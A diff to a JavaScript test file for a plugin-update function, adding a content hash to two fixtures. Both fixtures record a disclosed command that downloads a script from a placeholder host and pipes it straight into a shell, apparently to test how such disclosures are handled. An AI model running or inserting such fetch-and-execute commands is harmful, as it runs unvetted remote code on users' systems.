@@ -319,6 +319,7 @@ describe('runUpdate', () => {
         agentName: 'Alpha',
         installPath: '/work/alpha/.dork/plugins/flow',
         disclosed: runs('curl -s https://x.example | sh'),
+        contentHash: 'sha256:staged',
       });
       const fetchMock = vi
         .fn()
@@ -354,6 +355,7 @@ describe('runUpdate', () => {
             installPath: '/work/alpha/.dork/plugins/flow',
             latestVersion: '0.7.3',
             disclosed: runs('curl -s https://x.example | sh'),
+            contentHash: 'sha256:staged',
           },
         ],
       });
